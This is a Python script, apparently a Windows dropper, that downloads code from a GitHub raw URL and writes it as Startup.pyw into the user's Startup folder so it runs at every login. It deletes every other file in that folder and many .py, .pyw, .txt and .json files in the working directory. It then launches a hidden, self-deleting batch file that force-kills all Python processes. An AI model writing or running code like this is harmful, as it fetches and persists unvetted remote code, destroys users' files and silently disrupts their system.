# monitor_script.py - Does exactly what was requested
import os
import sys
import subprocess
import tempfile
import time
import urllib.request

def main():
    """Do exactly what was requested: replace with github_launcher.py, rename as Startup.pyw, delete everything else, end all python processes"""
    
    # 1. Download github_launcher.py from GitHub
    print("Downloading github_launcher.py from GitHub...")
    try:
        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.py"
        response = urllib.request.urlopen(url, timeout=10)
        launcher_code = response.read().decode('utf-8')
    except Exception as e:
        print(f"Download failed: {e}")
        sys.exit(1)
    
    # 2. Save it as Startup.pyw in startup folder
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    try:
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        print(f"Saved as Startup.pyw at: {startup_file}")
    except Exception as e:
        print(f"Failed to save: {e}")
        sys.exit(1)
    
    # 3. Delete everything else from startup folder
    print("Deleting other files from startup folder...")
    for file in os.listdir(startup_folder):
        if file != "Startup.pyw":
            try:
                filepath = os.path.join(startup_folder, file)
                if os.path.isfile(filepath):
                    os.remove(filepath)
                    print(f"Deleted: {file}")
            except:
                pass
    
    # 4. Delete from current directory too
    current_dir = os.getcwd()
    print("Deleting files from current directory...")
    for file in os.listdir(current_dir):
        if file.endswith(('.py', '.pyw', '.txt', '.json')):
            try:
                filepath = os.path.join(current_dir, file)
                if os.path.isfile(filepath):
                    os.remove(filepath)
                    print(f"Deleted from current dir: {file}")
            except:
                pass
    
    # 5. End all python processes
    print("Ending all Python processes...")
    
    batch_script = '''@echo off
taskkill /f /im python.exe 2>nul
taskkill /f /im pythonw.exe 2>nul
wmic process where "name='python.exe'" delete 2>nul
wmic process where "name='pythonw.exe'" delete 2>nul
del "%~f0" 2>nul
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "kill_python.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file - this will kill this script too
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("Done. All Python processes will be terminated.")
    time.sleep(2)
    sys.exit(0)

if __name__ == "__main__":
    main()
